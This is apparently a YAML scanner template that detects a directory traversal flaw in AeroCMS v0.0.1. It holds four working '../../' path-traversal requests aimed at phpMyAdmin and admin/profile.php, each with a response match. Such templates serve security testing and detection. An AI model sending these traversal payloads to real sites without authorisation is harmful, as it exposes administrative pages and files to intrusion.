id: AeroCMSv0.0.1-Directory-traversal-vulnerability

info:
  name: AeroCMS v0.0.1 目录遍历漏洞
  author: daffainfo
  severity: critical
  description: AeroCMS v0.0.1 被发现包含目录遍历漏洞。该漏洞是由于未能规范化 url。该漏洞允许攻击者读取网站根目录中的任意文件。
  reference:
    - https://github.com/MegaTKC/AeroCMS/issues/7

rules:
  r0:
    request:
      method: GET
      path: /includes/../../phpMyAdmin/index.php
    expression: response.status == 200 && response.body.bcontains(b'phpMyAdmin') 
  r1:
    request:
      method: GET
      path: /images/../../admin/profile.php
    expression: response.status == 200 && response.body.bcontains(b'username') 
  r2:
    request:
      method: GET
      path: /js/../../admin/profile.php
    expression: response.status == 200 && response.body.bcontains(b'username') 
  r3:
    request:
      method: GET
      path: /fonts/../../admin/profile.php
    expression: response.status == 200 && response.body.bcontains(b'username') 
expression: r0() || r1() || r2() || r3()